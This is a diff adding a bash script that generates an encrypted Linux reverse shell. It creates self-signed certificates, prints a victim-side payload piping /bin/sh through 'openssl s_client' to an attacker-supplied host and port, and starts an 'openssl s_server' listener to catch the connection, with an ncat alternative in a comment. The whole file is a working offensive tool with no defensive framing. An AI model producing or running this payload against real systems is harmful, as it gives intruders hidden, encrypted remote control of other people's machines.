@@ -1,0 +1,42 @@
+#!/bin/bash
+
+function openssl_server(){
+
+	printf "[\e[0;32m+\e[0m] Creating ssl certs\n"
+	openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -subj "/C=UN/ST=Unknown/L=Unknown/O=Unk/CN=www.unknowsite.com"
+	printf "\n"
+
+	printf "[\e[0;33m+\e[0m] Target payload\n\n"
+	printf "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $rhost:$rport > /tmp/s; rm /tmp/s"
+
+	printf "\n\n"
+
+	printf "[\e[0;32m+\e[0m] Starting openssl server\n"
+	printf "[\e[0;32m+\e[0m] Listening in $rport\n"
+	printf "Openssl server waiting for incomming connection\n"
+	openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port $rport
+	# or
+	# ncat --ssl -vv -l -p 4444
+
+}
+
+
+function Craft_openssl_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux openssl reverse tcp shell\n"
+                printf "Usage bash linux_openssl-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+        openssl_server
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_openssl_reverse_shell "$1" "$2"
